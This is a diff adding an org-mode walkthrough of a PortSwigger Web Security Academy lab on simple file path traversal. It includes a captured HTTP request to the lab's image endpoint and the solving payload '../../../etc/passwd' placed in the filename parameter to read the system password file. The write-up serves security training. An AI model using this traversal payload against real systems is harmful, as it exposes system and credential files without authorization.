@@ -1,0 +1,40 @@
+#+title: File path traversal, simple case
+
+* Table of Contents :toc:
+- [[#lab-contains][Lab Contains]]
+- [[#end-goal][End Goal]]
+- [[#solution][Solution]]
+
+* Lab Contains
+- path traversal vulnerability on ~display of product images~
+* End Goal
+- retrieve the contents of ~/etc/passwd~ file
+* Solution
+- Access the lab and observe
+- open the product image on new tab and capture on burpsuite
+  - url looks like this ~https://0a8200a2030143cb8e636fc700dc0020.web-security-academy.net/image?filename=64.jpg~
+  - Here we can see that it is accepting file name through ~filename~ parameter
+  #+begin_src shell
+    GET /image?filename=64.jpg HTTP/2
+    Host: 0a8200a2030143cb8e636fc700dc0020.web-security-academy.net
+    Cookie: session=gYmApEQ4cnHG30l6REoPezlpfAuCg6tX
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Referer: https://0a8200a2030143cb8e636fc700dc0020.web-security-academy.net/product?productId=1
+    Dnt: 1
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Sec-Gpc: 1
+    Te: trailers
+  #+end_src
+- Now change the file name ~64.png~ to ~/etc/passwd~ and send the request
+  - ~400 Bad request~: File not found
+  - Now try with directory traversal sequences like ~../../../etc/passwd~
+  - Awla! ~200 OK~ found the file. It is showing the the content of /etc/passwd file
+
+So the correct payload to solve this lab is *../../../etc/passwd*
